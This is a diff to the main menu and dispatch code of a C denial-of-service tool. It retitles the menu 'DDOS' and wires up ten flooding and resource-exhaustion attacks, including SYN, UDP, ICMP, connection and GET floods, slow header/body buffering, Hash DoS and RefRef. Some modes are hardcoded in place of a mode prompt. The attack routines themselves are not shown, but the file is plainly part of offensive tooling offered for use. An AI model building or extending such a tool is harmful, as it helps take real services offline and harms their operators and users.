@@ -51,18 +51,17 @@ int choose_running_type() {
 }
 
 int type_choose_menu() {
-	printf("==Server Independent==\n");
+	printf("- = D D O S = -\n");
 	printf("1. SYN flooding\n"
 			"2. UDP flooding\n"
 			"3. ICMP flooding\n"
-			"4. Connection flooding\n\n"
-			"==Server Dependent==\n"
+			"4. Connection flooding\n"
 			"5. Get flooding\n"
 			"6. Header buffering\n"
 			"7. Body buffering\n"
 			"8. Response buffering\n"
 			"9. Hash Dos\n"
-			"10. RefRef\n");
+			"10. RefRef\n\n");
 
 	get_input();
 	int t = atoi(input);
@@ -84,11 +83,10 @@ int main(void) {
 
 		switch (type) {
 		case 1:		//syn flooding
-			mode = choose_running_type();
-			syn_flood_print_usage(mode);
+			syn_flood_print_usage(2);
 			get_input();
 			make_tokens();
-			syn_flood_run(tokens, mode);
+			syn_flood_run(tokens, 2);
 			break;
 		case 2:		//UDP flooding
 			udp_flood_print_usage();
@@ -97,24 +95,22 @@ int main(void) {
 			udp_flood_main(tokens);
 			break;
 		case 3:		//ICMP flooding
-			mode = choose_running_type();
-			icmp_flood_print_usage(mode);
+			icmp_flood_print_usage(2);
 			get_input();
 			make_tokens();
-			icmp_flood_run(tokens, mode);
+			icmp_flood_run(tokens, 2);
 			break; 
 		case 4:		//connection flooding
-			conn_flood_print_usage(2);
+			conn_flood_print_usage(1);
 			get_input();
 			make_tokens();
-			conn_flood_run(tokens,2);
+			conn_flood_run(tokens,1);
 			break;
 		case 5:		//get flooding
-			mode = choose_running_type();
-			get_flood_print_usage(mode);
+			get_flood_print_usage(2);
 			get_input();
 			make_tokens();
-			get_flood_run(tokens,mode);
+			get_flood_run(tokens,2);
 			break; 
 		case 6: //header buffering
 			header_buffering_print_usage();
